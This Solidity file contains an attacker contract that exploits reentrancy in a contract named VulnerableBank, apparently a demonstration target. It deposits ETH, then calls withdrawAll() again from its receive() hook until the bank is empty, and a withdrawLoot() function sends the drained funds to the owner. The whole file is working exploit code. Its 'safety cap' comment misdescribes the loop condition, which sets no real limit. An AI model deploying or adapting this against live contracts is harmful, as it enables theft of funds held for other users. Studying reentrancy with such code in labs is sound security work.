// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;
interface IVulnerableBank {
    function deposit() external payable;
    function withdrawAll() external;
}
contract Attacker {
    IVulnerableBank public target;
    address public owner;
    uint256 public counter;
    constructor(address _target) {
        target = IVulnerableBank(_target);
        owner = msg.sender;
    }
    // Called when VulnerableBank sends ETH to this contract
    receive() external payable {
        // Re-enter while target still has funds (safety cap to avoid infinite loop)
        uint256 tBal = address(target).balance;
        if (tBal > 0 && counter < tBal) {
            // unlimited withdrawing till 0
            counter++;
            target.withdrawAll();
        }
    }
    // Start attack by depositing then withdrawing once
    function attack() external payable {
        require(msg.value > 0, "need eth");
        target.deposit{value: msg.value}();
        target.withdrawAll(); // first withdraw triggers receive() -> reentry
    }
    function withdrawLoot() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}
